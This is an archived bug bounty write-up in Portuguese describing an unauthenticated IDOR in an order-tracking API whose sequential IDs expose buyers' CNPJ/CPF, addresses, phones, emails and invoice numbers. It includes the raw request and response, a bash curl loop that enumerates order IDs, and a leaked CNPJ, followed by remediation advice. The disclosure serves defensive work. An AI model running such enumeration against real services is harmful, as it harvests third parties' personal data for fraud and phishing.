# Critical IDOR in Order Tracking

- **Source URL:** https://medium.com/@donghcoder/critical-idor-in-order-tracking-sequential-ids-zero-authentication-anyones-orders-and-pii-789247650c89
- **Fetched from:** https://web.archive.org/web/20261006212009/https://medium.com/@donghcoder/critical-idor-in-order-tracking-sequential-ids-zero-authentication-anyones-orders-and-pii-789247650c89
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14905 (id 14905)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Critical IDOR in Order Tracking: Sequential IDs + Zero Authentication = Anyone’s Orders (and PII)

durante um bug bounty eu sempre procuro achar rotas que pode ser sujeita a IDOR, essa eu encontrei um site **\*\*rastreio de pedidos\*\*** que aceitava o número do pedido como ID **\*\*numérico sequencial\*\*** e retorna o payload completo **\*\*sem exigir autenticação\*\***. Como os IDs são previsíveis, basta incrementar o número para ler os dados de **\*\*qualquer pedido de qualquer cliente\*\*** — incluindo CNPJ/CPF do comprador, endereço completo, telefone, e-mail e número da nota fiscal. Um IDOR (Insecure Direct Object Reference) com impacto crítico de confidencialidade, sem nenhuma interação do usuário.

\`\`\`

GET [https://resume.com/tracking/api/order/{idPedido}](https://resume.com/tracking/api/order/{idPedido})

\`\`\`

sem \`Authorization\`, sem cookie, sem token → **\*\*200 OK com dados de terceiros\*\***.

**— -**

**## como achei o endpoint**

O site não expunha a API no HTML — o caminho veio do **\*\*bundle JavaScript\*\*** principal. Procurando por padrões de URL no JS:

\`\`\`js

// trecho do bundle (simplificado)

const NZ = {

apiTracking: “https://resume.com/tracking-back/...", // backend de tracking

…

}

\`\`\`

A partir do nome da função chamada pelo front (\`getOrderTracking\`) ficou trivial derivar a rota REST:

\`\`\`

GET /tracking-acompanhamento/v2/api/pedido/tracking/idPedido/2000001

\`\`\`

Primeiro teste, sem nenhum header de autenticação:

\`\`\`http

GET /tracking-acompanhamento/v2/api/pedido/tracking/idPedido/1999996 HTTP/1.1

Host: resume.com

\`\`\`

\`\`\`json

HTTP/1.1 200 OK

{

“idPedido”: 1999996,

“status”: “…”,

“destinatario”: { “cnpj”: “44.446.904/0001–10”, “razaoSocial”: “…” },

“endereco”: { “logradouro”: “…”, “numero”: “…”, “cidade”: “…”, “uf”: “…” },

“contato”: { “telefone”: “…”, “email”: “…” },

## Get Guilhermegh’s stories in your inbox

Join Medium for free to get updates from this writer.

“notaFiscal”: { “numero”: “445395”, “serie”: “…” }

}

\`\`\`

**\*\*Sem login, sem token, sem rate limit.\*\***

**— -**

**## IDs sequenciais = enumeração trivial**

O identificador não é UUID — é um inteiro sequencial (\`1999996\`, \`1999997\`, …). Basta um loop:

\`\`\`bash

for id in $(seq 1999996 2000020); do

curl -s “https://resume.com/tracking-acompanhamento/v2/api/pedido/tracking/idPedido/$id"

done

\`\`\`

Resultado: **\*\*7 de 25 pedidos consecutivos pertenciam a terceiros\*\***, cada um com CNPJ, endereço, telefone, e-mail e NF — inclusive pedidos de **\*\*órgãos públicos\*\*** (Prefeituras), o que agrava a criticidade.

| idPedido | Dados vazados |

| — -| — -|

| 1999996 | CNPJ, endereço, telefone, e-mail, NF |

| 1999997 | CNPJ, endereço, telefone, e-mail, NF |

| … | … |

| 2000020 | CNPJ, endereço, telefone, e-mail, NF |

A base inteira tem **\*\*dezenas de milhares de pedidos\*\*** — o impacto é escala total.

**— -**

**## por que isso é crítico e não “só um IDOR”**

**\*\*Zero autenticação\*\***: não há como “logs de acesso” diferenciarem um usuário legítimo de um atacante — qualquer request é igual.

**\*\*Dados de terceiros\*\***: cada ID retornado pertence a um cliente diferente; a enumeração transforma 1 vítima em N vítimas.

**\*\*PII sensível\*\***: CNPJ/CPF + endereço completo + telefone + e-mail + NF configuram material para fraude, phishing direcionado e LGPD (dado pessoal de titular sem consentimento).

**\*\*Sem rate limit nem bloqueio\*\***: os requests sequenciais passaram sem 403/429.

**— -**

**## correção recomendada que eu passei**

1\. **\*\*Autenticação obrigatória\*\*** no endpoint (sessão/token) — hoje não há nenhum controle.

2\. **\*\*Autorização por objeto (IDOR)\*\***: o pedido só deve ser retornado se pertencer ao usuário autenticado (\`WHERE idPedido = X AND cliente = sessao\`).

3\. **\*\*IDs não enumeráveis\*\***: trocar o inteiro sequencial por UUID/Hashid na URL pública.

4\. **\*\*Rate limiting\*\*** no tracking.

5\. **\*\*Logging e alerta\*\*** de varredura sequencial (N requests a IDs consecutivos em janela curta).
